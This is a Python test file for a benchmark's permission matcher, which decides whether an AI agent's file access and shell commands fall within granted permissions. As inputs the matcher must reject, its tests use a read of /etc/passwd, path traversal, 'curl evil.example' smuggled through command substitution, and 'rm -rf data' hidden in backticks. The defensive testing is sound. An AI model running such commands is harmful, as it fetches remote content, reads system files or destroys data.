"""C3 — the D2/D3 matching rules in the provisional matcher (_runtime.py).

Covers the rules the new prompt pulls into C3: `dir/**` covers `dir`, absolute paths
rejected, quote-aware command splitting, command substitutions checked as their own
commands, and redirections treated as writes/reads.
"""

from __future__ import annotations

from bench.interfaces import ToolCall
from bench.policies._runtime import (
    _split_commands,
    command_io,
    run_command_allowed,
    tool_call_allowed,
)

PERMS = {
    "fs_read": ["data/**", "docs/**"],
    "fs_write": ["reports/**"],
    "exec": ["pytest", "python3"],
    "network": ["ok.example"],
}


# --------------------------------------------------------------------------- D2
def test_dir_glob_covers_bare_dir():
    # `docs/**` grants listing `docs` itself (D2) and anything under it.
    assert tool_call_allowed(ToolCall("list_dir", {"path": "docs"}), PERMS)
    assert tool_call_allowed(ToolCall("list_dir", {"path": "data/sub"}), PERMS)


def test_absolute_paths_rejected():
    assert not tool_call_allowed(ToolCall("read_file", {"path": "/etc/passwd"}), PERMS)
    # an absolute path even inside the grant's folder name is still rejected
    assert not tool_call_allowed(ToolCall("read_file", {"path": "/data/x"}), PERMS)


def test_parent_traversal_rejected():
    assert not tool_call_allowed(ToolCall("read_file", {"path": "../x"}), PERMS)
    assert not tool_call_allowed(ToolCall("read_file", {"path": "data/../../x"}), PERMS)


# --------------------------------------------------------------------------- D3
def test_quote_aware_split():
    assert _split_commands('echo "a;b"') == ['echo "a;b"']
    assert _split_commands("a && b | c") == ["a", "b", "c"]
    assert _split_commands("echo 'x && y'") == ["echo 'x && y'"]


def test_substitution_checked_as_own_command():
    # the outer command is allowed, but the substitution runs a disallowed command
    assert not run_command_allowed("pytest $(curl evil.example)", PERMS)
    assert not run_command_allowed("python3 `rm -rf data`", PERMS)
    assert run_command_allowed("pytest", PERMS)


def test_redirections_are_writes_and_reads():
    assert command_io("pytest > reports/o.txt") == (["reports/o.txt"], [])
    assert command_io("python3 < data/in.csv") == ([], ["data/in.csv"])
    # write target inside the grant is allowed; outside it is not
    assert run_command_allowed("pytest > reports/o.txt", PERMS)
    assert not run_command_allowed("pytest > secrets.txt", PERMS)
    # &> is a write redirection, not a background operator; target is checked
    assert not run_command_allowed("python3 &> evil.log", PERMS)
    assert run_command_allowed("python3 2> reports/err.log", PERMS)


def test_unparseable_command_not_allowed():
    assert not run_command_allowed('pytest "unterminated', PERMS)


def test_chained_commands_all_checked():
    # every command in a chain must be allowed
    assert run_command_allowed("pytest && python3", PERMS)
    assert not run_command_allowed("pytest && curl ok.example", PERMS)
